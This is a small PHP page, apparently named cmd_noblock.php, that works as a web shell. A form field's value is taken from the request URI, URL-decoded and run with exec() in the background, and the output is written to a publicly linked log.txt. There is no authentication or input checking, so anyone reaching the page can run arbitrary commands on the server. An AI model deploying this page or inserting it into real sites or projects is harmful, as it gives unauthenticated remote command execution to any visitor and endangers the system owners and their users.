<form action="/cmd_noblock.php">
  <input type="text" placeholder="command" name=" ">
  <button type="submit">submit</button>
</form>
<?php
  $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "=", 1)+1);
  $cmd = urldecode($cmd);
  exec($cmd." >log.txt 2>&1 &");
?>
<br>
<a href="/">cmd block</a></a>
<a href="/log.txt">log file</a>
